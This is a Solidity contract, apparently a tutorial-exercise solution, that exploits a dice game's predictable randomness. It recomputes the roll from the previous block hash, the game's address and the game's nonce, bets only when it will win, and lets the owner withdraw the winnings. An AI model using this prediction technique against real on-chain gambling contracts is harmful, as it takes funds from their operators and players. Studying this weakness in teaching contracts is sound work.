pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

  /// @notice DiceGame instance
  DiceGame public diceGame;

  /// @notice Constructor
  constructor(address payable diceGameAddress) {
    diceGame = DiceGame(diceGameAddress);
  }

  //Add withdraw function to transfer ether from the rigged contract to an address

  /// @notice Predict the dice roll's outcome
  function riggedRoll() public payable {
    require(address(this).balance >= 0.002 ether, "Minimum bet is 0.002 ether");

    // calculating roll number
    bytes32 prevHash = blockhash(block.number - 1);
    uint256 nonce = diceGame.nonce();
    bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
    uint256 roll = uint256(hash) % 16;

    console.log("rolled ", roll);

    require(roll <= 2, "Rolling will not result in a winning number");
    diceGame.rollTheDice{value: 0.002 ether}();
  }

  /// @notice Withdraw ether from the contracts
  /// @param _addr Address to transfer ether to
  /// @param _amount Amount of ether to withdraw
  function withdraw(address _addr, uint256 _amount) public onlyOwner {
    require(address(this).balance >= _amount, "Insufficient balance to fulfil withdraw request");
    payable(_addr).transfer(_amount);
  }

  /// @notice Allow contrat to receive ETH
  receive() external payable {}
}
